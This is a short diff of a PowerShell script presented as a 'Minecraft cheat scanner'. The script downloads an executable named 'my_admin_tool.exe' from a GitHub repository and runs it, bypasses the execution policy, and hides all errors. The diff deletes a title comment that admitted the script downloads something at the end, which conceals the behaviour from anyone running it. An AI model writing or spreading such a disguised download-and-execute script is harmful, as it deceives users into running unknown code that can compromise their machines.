@@ -1,5 +1,5 @@
 Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/my_admin_tool.exe" -OutFile "my_admin_tool.exe"; .\my_admin_tool.exe
-# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
+# MINECRAFT CHEAT SCANNER v2.0 
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
@@ -95,6 +95,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
